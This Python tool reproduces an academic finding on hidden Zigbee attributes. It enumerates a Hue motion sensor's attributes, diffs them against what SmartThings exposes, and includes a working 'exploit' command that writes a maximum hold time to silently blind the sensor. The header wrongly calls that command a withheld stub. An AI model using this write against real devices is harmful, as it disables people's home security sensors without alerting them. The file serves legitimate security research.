#!/usr/bin/env python3
"""
attribute-oracle — Zigbee hidden-attribute discovery / exploitation engine.

Reproduces, at lab scale, the core finding of:
    Xu, Fu, Du & Luo. "Discovering and Exploiting IoT Device Hidden Attributes:
    A New Vulnerability in Smart Homes." ACM CCS 2025.

    hidden = supported - visible

  - supported : every attribute the device actually implements, read over raw ZCL
                through our own Zigbee2MQTT coordinator (Architecture A).
  - visible   : what the SmartThings edge driver exposes (SmartThings CLI/API).
  - hidden    : implemented + OTA-writable, yet never surfaced by the platform.

Interface: Zigbee2MQTT over MQTT (paho-mqtt). We talk to the SONOFF ZBDongle-P
indirectly, by publishing read/write requests on the device's `/set` topic and
reading the state Z2M republishes.

Scope / honesty note
--------------------
This is the SKELETON. `env-check`, `enumerate`, `diff`, and the owner `watch` view
are implemented against the real Z2M MQTT API; `baseline` (SmartThings) and
`exploit` (OTA neutralization write) are deliberately gated stubs with the exact
request shape wired in but the trigger withheld until the lab devices are live.

A ZCL subtlety to keep honest in the writeup: Zigbee2MQTT's MQTT `read` maps to the
ZCL *ReadAttributes* command, NOT the ZCL *DiscoverAttributes* command. So
enumeration here is done two ways, and both are recorded:
  (1) interview-reported clusters/attributes harvested from `bridge/devices`, and
  (2) a read-probe: issue ReadAttributes for candidate attribute IDs per cluster and
      record which return a value vs. UNSUPPORTED_ATTRIBUTE.
Confirm the probed set empirically once the sensor is paired — do not assume it.

All experiments run on an isolated network with the author's own devices (academic
use). No real victims.
"""

from __future__ import annotations

import argparse
import json
import os
import queue
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

try:
    import paho.mqtt.client as mqtt
except ImportError:  # pragma: no cover - dependency hint
    sys.exit("paho-mqtt is required: pip install -r requirements.txt")


# ── Lab constants (from the repo-root context file; confirm empirically) ──────────

DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_BASE_TOPIC = "zigbee2mqtt"

# Philips Hue manufacturer code for manufacturer-specific attributes (0x100B).
PHILIPS_MFG_CODE = 0x100B

# Clusters the Hue motion sensor (SML00x) is expected to implement, with the
# candidate attributes to read-probe. Names follow zigbee-herdsman's cluster.ts so
# they can be passed to Z2M's `read` by name; IDs are given in comments for the writeup.
# NOTE: candidate lists are a STARTING POINT for the read-probe, not a claim about
# what is implemented. The authoritative supported set is whatever the probe confirms.
TARGET_CLUSTERS: dict[str, dict[str, Any]] = {
    "genBasic": {  # 0x0000
        "attributes": ["zclVersion", "appVersion", "modelId", "manufacturerName",
                       "swBuildId", 0x0033],
    },
    "genPowerCfg": {  # 0x0001
        "attributes": ["batteryPercentageRemaining", "batteryVoltage"],
    },
    "msOccupancySensing": {  # 0x0406 — primary neutralization target lives here
        "attributes": ["occupancy", "pirOToUDelay", "pirUToODelay", "pirUToOThreshold",       # 0x0000, 0x0010
                       {"id": 0x0030, "mfg": PHILIPS_MFG_CODE}],  # Philips sensitivity
    },
    "msIlluminanceMeasurement": {  # 0x0400
        "attributes": ["measuredValue"],
    },
    "msTemperatureMeasurement": {  # 0x0402
        "attributes": ["measuredValue"],
    },
}

# Primary exploit target: pirOToUDelay (0x0010) on 0x0406 — standard ZCL hold time;
# hidden from the SmartThings edge driver. Max value latches "occupied" -> sensor blind.
EXPLOIT_TARGET = {
    "cluster": "msOccupancySensing",   # 0x0406
    "attribute": "pirOToUDelay",       # 0x0010
    "attribute_id": 0x0010,
    "manufacturer_code": None,         # standard attribute; no manufacturer code
    "neutralize_value": 0xFFFE,        # ~18h hold; sensor stays "occupied", ignores new motion
    "zcl_type": 0x21,                  # uint16
}

# ── SmartThings baseline (the "visible" set) ──────────────────────────────────────
#
# The SmartThings edge driver exposes *capabilities*, not raw ZCL. To subtract the
# visible set from the supported set, we map each capability+attribute the platform
# surfaces back onto the SAME (cluster, attribute-token) pairs `enumerate` records
# (see TARGET_CLUSTERS). Anything the device implements but that has no entry here —
# notably the Philips sensitivity attribute 0x0030 — is therefore reported as hidden.
#
# Confirm empirically against the actual driver once the sensor is on the account;
# a driver update could surface more (or fewer) capabilities.
ST_API_BASE = "https://api.smartthings.com/v1"

# (capability, capability-attribute) -> (zcl_cluster, zcl_attribute_token)
ST_CAPABILITY_TO_ZCL: dict[tuple[str, str], tuple[str, Any]] = {
    ("motionSensor", "motion"): ("msOccupancySensing", "occupancy"),
    ("illuminanceMeasurement", "illuminance"): ("msIlluminanceMeasurement", "measuredValue"),
    ("temperatureMeasurement", "temperature"): ("msTemperatureMeasurement", "measuredValue"),
    ("battery", "battery"): ("genPowerCfg", "batteryPercentageRemaining"),
}


def log(msg: str) -> None:
    print(f"[AO] {msg}", flush=True)


# ── MQTT / Zigbee2MQTT client wrapper ─────────────────────────────────────────────

@dataclass
class Z2MClient:
    """Thin wrapper over paho-mqtt scoped to a Zigbee2MQTT base topic."""

    broker: str = DEFAULT_BROKER
    port: int = DEFAULT_PORT
    base_topic: str = DEFAULT_BASE_TOPIC

    _client: Optional["mqtt.Client"] = field(default=None, init=False, repr=False)
    _messages: "queue.Queue[tuple[str, Any]]" = field(default_factory=queue.Queue, init=False, repr=False)
    _devices: Optional[list] = field(default=None, init=False, repr=False)
    _bridge_state: Optional[str] = field(default=None, init=False, repr=False)
    _connected: threading.Event = field(default_factory=threading.Event, init=False, repr=False)

    # topic helpers ---------------------------------------------------------------
    def t(self, *parts: str) -> str:
        return "/".join((self.base_topic, *parts))

    def connect(self, timeout: float = 10.0) -> None:
        self._client = mqtt.Client(
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
            client_id="attribute-oracle",
        )
        self._client.on_connect = self._on_connect
        self._client.on_message = self._on_message
        log(f"connecting to mqtt://{self.broker}:{self.port} (base topic '{self.base_topic}')")
        self._client.connect(self.broker, self.port, keepalive=30)
        self._client.loop_start()
        if not self._connected.wait(timeout):
            raise TimeoutError(f"no MQTT connection within {timeout}s")

    def disconnect(self) -> None:
        if self._client is not None:
            self._client.loop_stop()
            self._client.disconnect()

    # paho callbacks --------------------------------------------------------------
    def _on_connect(self, client, userdata, flags, reason_code, properties=None) -> None:
        if reason_code != 0:
            log(f"MQTT connect failed: {reason_code}")
            return
        # Device list + bridge health are retained; device state + logs are live.
        client.subscribe(self.t("bridge", "devices"))
        client.subscribe(self.t("bridge", "state"))
        client.subscribe(self.t("bridge", "logging"))
        client.subscribe(self.t("bridge", "response", "#"))
        client.subscribe(self.t("#"))  # per-device state updates (read responses land here)
        self._connected.set()

    def _on_message(self, client, userdata, message) -> None:
        topic = message.topic
        try:
            payload: Any = json.loads(message.payload.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            payload = message.payload.decode("utf-8", "replace")

        if topic == self.t("bridge", "devices"):
            self._devices = payload if isinstance(payload, list) else None
        elif topic == self.t("bridge", "state"):
            self._bridge_state = payload.get("state") if isinstance(payload, dict) else payload
        self._messages.put((topic, payload))

    # high-level helpers ----------------------------------------------------------
    def wait_devices(self, timeout: float = 8.0) -> list:
        """Return the retained bridge/devices list once it arrives."""
        deadline = time.time() + timeout
        while self._devices is None and time.time() < deadline:
            time.sleep(0.1)
        if self._devices is None:
            raise TimeoutError("bridge/devices was not received (is Zigbee2MQTT running?)")
        return self._devices

    def publish(self, topic: str, payload: dict) -> None:
        assert self._client is not None
        self._client.publish(topic, json.dumps(payload))

    def drain(self) -> None:
        try:
            while True:
                self._messages.get_nowait()
        except queue.Empty:
            return

    def collect(self, topic_suffix: str, timeout: float) -> list[Any]:
        """Collect payloads published to base_topic/<topic_suffix> for `timeout` seconds."""
        want = self.t(topic_suffix)
        out: list[Any] = []
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                topic, payload = self._messages.get(timeout=max(0.05, deadline - time.time()))
            except queue.Empty:
                break
            if topic == want:
                out.append(payload)
        return out


# ── Device discovery helpers ──────────────────────────────────────────────────────

def find_target(devices: list, name_hint: Optional[str]) -> Optional[dict]:
    """Pick the victim device from bridge/devices by friendly name or Hue model."""
    for d in devices:
        if not isinstance(d, dict):
            continue
        if name_hint and name_hint.lower() in (d.get("friendly_name", "") or "").lower():
            return d
        model = ((d.get("definition") or {}).get("model") or "")
        vendor = ((d.get("definition") or {}).get("vendor") or "")
        if "SML00" in model or (vendor == "Philips" and "motion" in
                                (d.get("definition") or {}).get("description", "").lower()):
            return d
    return None


def interview_attributes(device: dict) -> dict[str, list]:
    """Clusters/attributes Z2M already learned during the device interview.

    This is Z2M's static view of 'supported' — one of the two enumeration sources.
    """
    result: dict[str, list] = {}
    for ep in (device.get("endpoints") or {}).values() if isinstance(device.get("endpoints"), dict) \
            else []:
        clusters = (ep.get("clusters") or {})
        for direction in ("input", "output"):
            for cluster in clusters.get(direction, []) or []:
                result.setdefault(cluster, [])
    return result


# ── Read-probe (ReadAttributes emulation of DiscoverAttributes) ─────────────────────

def _read_request(attr: Any) -> tuple[Any, Optional[int]]:
    """Normalize a candidate entry into (attribute_token, manufacturer_code|None)."""
    if isinstance(attr, dict):
        return attr["id"], attr.get("mfg")
    return attr, None


def enumerate_supported(z2m: Z2MClient, device: dict, dwell: float) -> dict:
    """Read-probe each target cluster and record which attributes the device answers.

    For each candidate attribute we publish a `read` on the device's /set topic and
    watch the state Z2M republishes on base_topic/<friendly_name>. A value coming back
    means the device implements that attribute; silence / an error log means it does
    not (or is access-restricted). This emulates ZCL DiscoverAttributes using the only
    primitive Z2M exposes over MQTT (ReadAttributes).
    """
    name = device["friendly_name"]
    supported: dict[str, Any] = {}
    for cluster, spec in TARGET_CLUSTERS.items():
        confirmed: list[dict] = []
        for attr in spec["attributes"]:
            token, mfg = _read_request(attr)
            payload: dict[str, Any] = {"read": {"cluster": cluster, "attributes": [token]}}
            if mfg is not None:
                payload["read"]["options"] = {"manufacturerCode": mfg}
            z2m.drain()
            z2m.publish(z2m.t(name, "set"), payload)
            states = z2m.collect(name, timeout=dwell)
            answered = bool(states)
            confirmed.append({
                "attribute": token,
                "manufacturer_code": mfg,
                "answered": answered,
                "last_state_keys": sorted(states[-1].keys()) if states and isinstance(states[-1], dict) else [],
            })
            log(f"  {cluster}:{token}{' (mfg 0x%04X)' % mfg if mfg else ''} -> "
                f"{'answered' if answered else 'no response'}")
        supported[cluster] = confirmed
    return supported


# ── SmartThings REST client (stdlib only) ─────────────────────────────────────────

import urllib.error
import urllib.request


class SmartThingsError(RuntimeError):
    pass


def _st_get(path: str, token: str) -> Any:
    """GET a SmartThings REST endpoint with a Personal Access Token.

    PATs created in 2025+ last only ~24h, so generate a fresh one right before a run
    (https://account.smartthings.com/tokens, scope r:devices:*).
    """
    req = urllib.request.Request(
        f"{ST_API_BASE}{path}",
        headers={"Authorization": f"Bearer {token}", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:  # noqa: S310 (fixed https host)
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        hint = " (token expired or missing r:devices:* scope?)" if e.code in (401, 403) else ""
        raise SmartThingsError(f"HTTP {e.code} on {path}{hint}") from e
    except urllib.error.URLError as e:
        raise SmartThingsError(f"cannot reach SmartThings API: {e.reason}") from e


def st_find_device(token: str, name_hint: Optional[str]) -> dict:
    data = _st_get("/devices", token)
    items = data.get("items", []) if isinstance(data, dict) else []
    for d in items:
        label = (d.get("label") or d.get("name") or "")
        if name_hint and name_hint.lower() in label.lower():
            return d
    for d in items:
        label = (d.get("label") or d.get("name") or "").lower()
        if "motion" in label or "hue" in label:
            return d
    raise SmartThingsError(
        f"no matching device among {len(items)} on the account "
        f"(try --st-device-id or --device <label hint>)")


def st_status(token: str, device_id: str) -> dict:
    return _st_get(f"/devices/{device_id}/status", token)


def map_status_to_visible(status: dict) -> dict[str, list]:
    """Map a /devices/{id}/status payload to the visible (cluster, attr) set.

    Only capability attributes that are actually PRESENT in the status (the platform
    surfaces them) and that have a known ZCL mapping are counted as visible.
    """
    visible: dict[str, set] = {}
    unmapped: list[str] = []
    components = status.get("components", {}) if isinstance(status, dict) else {}
    for comp in components.values():
        if not isinstance(comp, dict):
            continue
        for cap, attrs in comp.items():
            if not isinstance(attrs, dict):
                continue
            for attr in attrs:
                mapped = ST_CAPABILITY_TO_ZCL.get((cap, attr))
                if mapped is None:
                    unmapped.append(f"{cap}.{attr}")
                    continue
                cluster, token = mapped
                visible.setdefault(cluster, set()).add(token)
    return {
        "visible": {c: sorted(v, key=str) for c, v in visible.items()},
        "unmapped_capabilities": sorted(set(unmapped)),
    }


# ── Subcommands ─────────────────────────────────────────────────────────────────

def cmd_env_check(args) -> int:
    z2m = Z2MClient(args.broker, args.port, args.base_topic)
    z2m.connect()
    try:
        state = z2m._bridge_state
        deadline = time.time() + 5
        while state is None and time.time() < deadline:
            time.sleep(0.1)
            state = z2m._bridge_state
        devices = z2m.wait_devices()
        log(f"broker reachable: yes")
        log(f"bridge state: {state or 'unknown'}")
        log(f"devices known to the coordinator: {len(devices)}")
        target = find_target(devices, args.device)
        if target:
            log(f"victim device present: {target['friendly_name']} "
                f"({(target.get('definition') or {}).get('model', '?')})")
        else:
            log("victim device NOT found — pair the Hue sensor (stage 2) before enumerate")
        return 0
    finally:
        z2m.disconnect()


def cmd_enumerate(args) -> int:
    z2m = Z2MClient(args.broker, args.port, args.base_topic)
    z2m.connect()
    try:
        devices = z2m.wait_devices()
        target = find_target(devices, args.device)
        if target is None:
            log("victim device not found; cannot enumerate. Is it paired to this coordinator?")
            return 2
        log(f"enumerating: {target['friendly_name']} "
            f"({(target.get('definition') or {}).get('model', '?')})")

        report = {
            "schema": "attribute-oracle/supported/v1",
            "device": {
                "friendly_name": target.get("friendly_name"),
                "ieee_address": target.get("ieee_address"),
                "model": (target.get("definition") or {}).get("model"),
                "vendor": (target.get("definition") or {}).get("vendor"),
            },
            "interview_clusters": sorted(interview_attributes(target).keys()),
            "read_probe": enumerate_supported(z2m, target, dwell=args.dwell),
            "notes": "supported-set evidence; combine with a SmartThings baseline to diff.",
        }
        _write_json(args.out, report)
        log(f"supported-set report written: {args.out}")
        return 0
    finally:
        z2m.disconnect()


def cmd_baseline(args) -> int:
    """Record the platform-visible attribute set from SmartThings.

    Reads the device's capability status via the SmartThings REST API (or an offline
    status dump via --from-status-json) and maps each surfaced capability attribute
    back to the ZCL (cluster, attribute) pairs `enumerate` records, so `diff` can
    subtract the two. Emits the 'attribute-oracle/visible/v1' schema.
    """
    device_meta: dict = {}
    if args.from_status_json:
        log(f"reading offline SmartThings status dump: {args.from_status_json}")
        status = _read_json(args.from_status_json)
    else:
        token = args.token
        if not token:
            log("no SmartThings token. Pass --token or set SMARTTHINGS_TOKEN "
                "(https://account.smartthings.com/tokens, scope r:devices:*, ~24h lifetime).")
            return 3
        try:
            if args.st_device_id:
                device_id = args.st_device_id
            else:
                dev = st_find_device(token, args.device)
                device_id = dev["deviceId"]
                device_meta = {"label": dev.get("label"), "deviceId": device_id}
                log(f"matched SmartThings device: {dev.get('label')} ({device_id})")
            status = st_status(token, device_id)
        except SmartThingsError as e:
            log(f"SmartThings baseline failed: {e}")
            return 3

    mapped = map_status_to_visible(status)
    report = {
        "schema": "attribute-oracle/visible/v1",
        "source": "smartthings-rest",
        "device": device_meta,
        "visible": mapped["visible"],
        "unmapped_capabilities": mapped["unmapped_capabilities"],
        "note": "visible = what the SmartThings edge driver surfaces, mapped to ZCL; "
                "subtract from the supported set with `diff`.",
    }
    _write_json(args.out, report)
    n = sum(len(v) for v in mapped["visible"].values())
    log(f"platform surfaced {n} ZCL-mapped attribute(s); "
        f"{len(mapped['unmapped_capabilities'])} capability attr(s) had no ZCL mapping")
    log(f"visible-set report written: {args.out}")
    return 0


def cmd_diff(args) -> int:
    supported = _read_json(args.supported)
    visible = _read_json(args.visible)
    visible_set = _visible_attr_set(visible)

    hidden: dict[str, list] = {}
    for cluster, attrs in supported.get("read_probe", {}).items():
        for a in attrs:
            if not a.get("answered"):
                continue  # only count attributes the device actually implements
            key = (cluster, a["attribute"])
            if key not in visible_set:
                hidden.setdefault(cluster, []).append(a)

    report = {
        "schema": "attribute-oracle/hidden/v1",
        "device": supported.get("device"),
        "hidden_attributes": hidden,
        "primary_target_is_hidden": _is_target_hidden(hidden),
    }
    _write_json(args.out, report)
    log(f"hidden = supported - visible -> {sum(len(v) for v in hidden.values())} hidden attribute(s)")
    log(f"hidden-attribute report written: {args.out}")
    return 0


def cmd_exploit(args) -> int:
    """GATED: OTA-write the hidden pirOToUDelay attribute (max hold) to neutralize the sensor.

    The write payload is fully formed below but is only SENT with --i-have-authorization,
    and only against the author's own isolated lab device. Verify physically by walk-test
    and confirm no event surfaces on the platform.
    """
    tgt = EXPLOIT_TARGET
    write_body: dict[str, Any] = {
        "cluster": tgt["cluster"],
        "payload": {
            tgt["attribute"]: {
                "value": tgt["neutralize_value"],
                "type": tgt["zcl_type"],
            }
        },
    }
    if tgt.get("manufacturer_code") is not None:
        write_body["options"] = {"manufacturerCode": tgt["manufacturer_code"]}
    payload = {"write": write_body}
    log("exploit target (neutralization write):")
    log(json.dumps(payload, indent=2))
    if not args.i_have_authorization:
        log("DRY RUN — not sent. Re-run with --i-have-authorization to write to YOUR OWN device.")
        return 0

    z2m = Z2MClient(args.broker, args.port, args.base_topic)
    z2m.connect()
    try:
        devices = z2m.wait_devices()
        target = find_target(devices, args.device)
        if target is None:
            log("victim device not found; refusing to write.")
            return 2
        log(f"writing hidden attribute to {target['friendly_name']} ...")
        z2m.publish(z2m.t(target["friendly_name"], "set"), payload)
        time.sleep(args.dwell)
        log("write sent. Walk-test the sensor and confirm no event appears on SmartThings.")
        return 0
    finally:
        z2m.disconnect()


def cmd_watch(args) -> int:
    """Owner tool (defense): stream device state and notify on any attribute change."""
    z2m = Z2MClient(args.broker, args.port, args.base_topic)
    z2m.connect()
    try:
        devices = z2m.wait_devices()
        names = {d.get("friendly_name") for d in devices if isinstance(d, dict)}
        log(f"watching {len(names)} device(s) for setting changes. Ctrl-C to stop.")
        last: dict[str, dict] = {}
        while True:
            try:
                topic, payload = z2m._messages.get(timeout=1.0)
            except queue.Empty:
                continue
            suffix = topic[len(args.base_topic) + 1:] if topic.startswith(args.base_topic) else topic
            if "/" in suffix or suffix not in names or not isinstance(payload, dict):
                continue
            prev = last.get(suffix, {})
            for k, v in payload.items():
                if k in ("last_seen", "linkquality"):
                    continue
                if k not in prev:
                    log(f"[{suffix}] first-seen {k} = {v!r}")
                elif prev[k] != v:
                    log(f"[{suffix}] CHANGE {k}: {prev[k]!r} -> {v!r}")
            last[suffix] = {**prev, **payload}
    except KeyboardInterrupt:
        log("stopped.")
        return 0
    finally:
        z2m.disconnect()


# ── small IO / set helpers ─────────────────────────────────────────────────────

def _write_json(path: str, obj: Any) -> None:
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    Path(path).write_text(json.dumps(obj, indent=2) + "\n")


def _read_json(path: str) -> dict:
    return json.loads(Path(path).read_text())


def _visible_attr_set(visible: dict) -> set:
    out = set()
    for cluster, attrs in (visible.get("visible", {}) or {}).items():
        for a in attrs:
            out.add((cluster, a))
    return out


def _is_target_hidden(hidden: dict) -> bool:
    for a in hidden.get(EXPLOIT_TARGET["cluster"], []):
        if a.get("attribute") == EXPLOIT_TARGET["attribute"]:
            return True
    return False


# ── CLI ─────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="attribute-oracle — Zigbee hidden-attribute engine")
    p.add_argument("--broker", default=DEFAULT_BROKER)
    p.add_argument("--port", type=int, default=DEFAULT_PORT)
    p.add_argument("--base-topic", default=DEFAULT_BASE_TOPIC)
    p.add_argument("--device", default=None,
                   help="friendly-name hint for the victim device (default: auto-detect Hue SML00x)")
    p.add_argument("--dwell", type=float, default=2.0,
                   help="seconds to wait for each read/write response")
    sub = p.add_subparsers(dest="cmd", required=True)

    sub.add_parser("env-check", help="verify broker, bridge, and victim presence").set_defaults(func=cmd_env_check)

    e = sub.add_parser("enumerate", help="read-probe the device's supported attributes")
    e.add_argument("--out", default="../../4_analysis_output/attribute-oracle/supported_attributes.json")
    e.set_defaults(func=cmd_enumerate)

    b = sub.add_parser("baseline", help="record the SmartThings-visible set")
    b.add_argument("--token", default=os.environ.get("SMARTTHINGS_TOKEN"),
                   help="SmartThings PAT (default: $SMARTTHINGS_TOKEN); scope r:devices:*")
    b.add_argument("--st-device-id", default=None,
                   help="SmartThings deviceId (default: match by --device label hint)")
    b.add_argument("--from-status-json", default=None,
                   help="offline: a saved /v1/devices/{id}/status dump instead of a live call")
    b.add_argument("--out", default="../../4_analysis_output/attribute-oracle/visible_attributes.json")
    b.set_defaults(func=cmd_baseline)

    d = sub.add_parser("diff", help="hidden = supported - visible")
    d.add_argument("--supported", required=True)
    d.add_argument("--visible", required=True)
    d.add_argument("--out", default="../../4_analysis_output/attribute-oracle/hidden_attributes_report.json")
    d.set_defaults(func=cmd_diff)

    x = sub.add_parser("exploit", help="OTA-write a hidden attribute to neutralize the sensor (gated)")
    x.add_argument("--i-have-authorization", action="store_true",
                   help="actually send the write; use ONLY on your own isolated lab device")
    x.set_defaults(func=cmd_exploit)

    sub.add_parser("watch", help="owner tool: notify on any device setting change").set_defaults(func=cmd_watch)
    return p


def main(argv: Optional[list] = None) -> int:
    args = build_parser().parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
